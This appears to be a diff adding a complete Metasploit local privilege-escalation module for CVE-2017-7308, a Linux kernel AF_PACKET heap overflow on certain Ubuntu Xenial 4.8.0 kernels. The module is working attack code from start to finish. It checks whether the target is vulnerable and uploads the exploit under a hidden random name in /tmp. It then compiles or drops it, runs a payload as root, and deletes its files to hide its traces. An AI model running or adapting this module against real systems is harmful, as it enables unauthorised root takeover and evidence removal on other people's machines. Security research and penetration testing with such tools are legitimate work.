@@ -1,0 +1,203 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = GoodRanking
+
+  include Msf::Post::File
+  include Msf::Post::Linux::Priv
+  include Msf::Post::Linux::System
+  include Msf::Post::Linux::Kernel
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'AF_PACKET packet_set_ring Privilege Escalation',
+      'Description'    => %q{
+        This module exploits a heap-out-of-bounds write in the packet_set_ring
+        function in net/packet/af_packet.c (AF_PACKET) in the Linux kernel
+        to execute code as root (CVE-2017-7308).
+
+        The bug was initially introduced in 2011 and patched in version 4.10.6,
+        potentially affecting a large number of kernels; however this exploit
+        targets only systems using Ubuntu Xenial kernels 4.8.0 < 4.8.0-46,
+        including Linux distros based on Ubuntu Xenial, such as Linux Mint.
+
+        The target system must have unprivileged user namespaces enabled and
+        two or more CPU cores.
+
+        Bypasses for SMEP, SMAP and KASLR are included. Failed exploitation
+        may crash the kernel.
+
+        This module has been tested successfully on Linux Mint 18 (x86_64)
+        with kernel versions:
+
+        4.8.0-34-generic;
+        4.8.0-36-generic;
+        4.8.0-39-generic;
+        4.8.0-41-generic;
+        4.8.0-42-generic;
+        4.8.0-44-generic;
+        4.8.0-45-generic.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Andrey Konovalov', # Discovery and C exploit
+          'Brendan Coles'     # Metasploit
+        ],
+      'DisclosureDate' => 'Mar 29 2017',
+      'Platform'       => [ 'linux' ],
+      'Arch'           => [ ARCH_X86, ARCH_X64 ],
+      'SessionTypes'   => [ 'shell', 'meterpreter' ],
+      'Targets'        => [[ 'Auto', {} ]],
+      'Privileged'     => true,
+      'References'     =>
+        [
+          [ 'EDB', '41994' ],
+          [ 'CVE', '2017-7308' ],
+          [ 'BID', '97234' ],
+          [ 'URL', 'https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html' ],
+          [ 'URL', 'https://www.coresecurity.com/blog/solving-post-exploitation-issue-cve-2017-7308' ],
+          [ 'URL', 'https://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-7308.html', ],
+          [ 'URL', 'https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-7308/poc.c' ],
+          [ 'URL', 'https://github.com/bcoles/kernel-exploits/blob/cve-2017-7308/CVE-2017-7308/poc.c' ]
+        ],
+      'DefaultTarget'  => 0))
+    register_options [
+      OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', %w(Auto True False) ]),
+      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ]),
+    ]
+  end
+
+  def base_dir
+    datastore['WritableDir'].to_s
+  end
+
+  def upload(path, data)
+    print_status "Writing '#{path}' (#{data.size} bytes) ..."
+    write_file path, data
+  end
+
+  def upload_and_chmodx(path, data)
+    upload path, data
+    cmd_exec "chmod +x '#{path}'"
+  end
+
+  def upload_and_compile(path, data)
+    upload "#{path}.c", data
+    gcc_cmd = "gcc -o #{path} #{path}.c"
+    if session.type.eql? 'shell'
+      gcc_cmd = "PATH=$PATH:/usr/bin/ #{gcc_cmd}"
+    end
+
+    output = cmd_exec gcc_cmd
+    unless output.blank?
+      print_error output
+      fail_with Failure::Unknown, "#{path}.c failed to compile"
+    end
+
+    cmd_exec "chmod +x #{path}"
+  end
+
+  def exploit_data(file)
+    path = ::File.join Msf::Config.data_directory, 'exploits', 'cve-2017-7308', file
+    fd = ::File.open path, 'rb'
+    data = fd.read fd.stat.size
+    fd.close
+    data
+  end
+
+  def live_compile?
+    return false unless datastore['COMPILE'].eql?('Auto') || datastore['COMPILE'].eql?('True')
+
+    if has_gcc?
+      vprint_good 'gcc is installed'
+      return true
+    end
+
+    unless datastore['COMPILE'].eql? 'Auto'
+      fail_with Failure::BadConfig, 'gcc is not installed. Compiling will fail.'
+    end
+  end
+
+  def check
+    version = kernel_release
+    unless version =~ /^4\.8\.0-(34|36|39|41|42|44|45)-generic/
+      vprint_error "Linux kernel version #{version} is not vulnerable"
+      return CheckCode::Safe
+    end
+    vprint_good "Linux kernel version #{version} is vulnerable"
+
+    arch = kernel_hardware
+    unless arch.include? 'x86_64'
+      vprint_error "System architecture #{arch} is not supported"
+      return CheckCode::Safe
+    end
+    vprint_good "System architecture #{arch} is supported"
+
+    cores = get_cpu_info[:cores].to_i
+    min_required_cores = 2
+    unless cores >= min_required_cores
+      vprint_error "System has less than #{min_required_cores} CPU cores"
+      return CheckCode::Safe
+    end
+    vprint_good "System has #{cores} CPU cores"
+
+    unless userns_enabled?
+      vprint_error 'Unprivileged user namespaces are not permitted'
+      return CheckCode::Safe
+    end
+    vprint_good 'Unprivileged user namespaces are permitted'
+
+    if kptr_restrict? && dmesg_restrict?
+      vprint_error 'Both kernel.kptr_restrict and kernel.dmesg_destrict are enabled. KASLR bypass will fail.'
+      return CheckCode::Safe
+    end
+
+    CheckCode::Appears
+  end
+
+  def exploit
+    if check != CheckCode::Appears
+      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
+    end
+
+    if is_root?
+      fail_with Failure::BadConfig, 'Session already has root privileges'
+    end
+
+    unless cmd_exec("test -w '#{base_dir}' && echo true").include? 'true'
+      fail_with Failure::BadConfig, "#{base_dir} is not writable"
+    end
+
+    # Upload exploit executable
+    executable_name = ".#{rand_text_alphanumeric rand(5..10)}"
+    executable_path = "#{base_dir}/#{executable_name}"
+    if live_compile?
+      vprint_status 'Live compiling exploit on system...'
+      upload_and_compile executable_path, exploit_data('poc.c')
+      rm_f "#{executable_path}.c"
+    else
+      vprint_status 'Dropping pre-compiled exploit on system...'
+      upload_and_chmodx executable_path, exploit_data('exploit')
+    end
+
+    # Upload payload executable
+    payload_path = "#{base_dir}/.#{rand_text_alphanumeric rand(5..10)}"
+    upload_and_chmodx payload_path, generate_payload_exe
+
+    # Launch exploit
+    print_status 'Launching exploit...'
+    output = cmd_exec "#{executable_path} #{payload_path}"
+    output.each_line { |line| vprint_status line.chomp }
+    print_status 'Deleting executable...'
+    rm_f executable_path
+    Rex.sleep 5
+    print_status 'Deleting payload...'
+    rm_f payload_path
+  end
+end
